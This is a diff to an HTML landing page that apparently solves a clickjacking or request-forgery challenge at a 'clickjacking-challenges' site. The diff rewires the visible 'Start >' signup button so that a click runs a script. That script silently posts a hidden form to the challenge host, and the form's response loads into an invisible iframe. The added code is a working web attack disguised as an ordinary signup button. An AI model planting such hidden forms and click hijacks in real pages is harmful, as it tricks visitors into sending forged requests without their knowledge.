@@ -21,8 +21,14 @@
 
 		<!-- Signup Form -->
 			<form id="signup-form" method="post" action="#">
-				<input type="submit" value="Start >" />
+				<input id="sub" type="submit" value="Start >" onclick="jack()" />
 			</form>
+
+			<iframe name="hide" id="frame" style="display:none"></iframe>
+				<form name="test" method="post" action="http://clickjacking-challenges.r7.io/level/2?name=evanc94" target="hide">
+					<input type="hidden" name="s" value="evanc94">
+				</form>
+
 
 		<!-- Footer -->
 			<footer id="footer">
@@ -40,6 +46,11 @@
 		<!-- Scripts -->
 			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
 			<script src="assets/js/main.js"></script>
+			<script>
+				function jack(){
+					document.test.submit();
+				}
+			</script>
 
 	</body>
 </html>
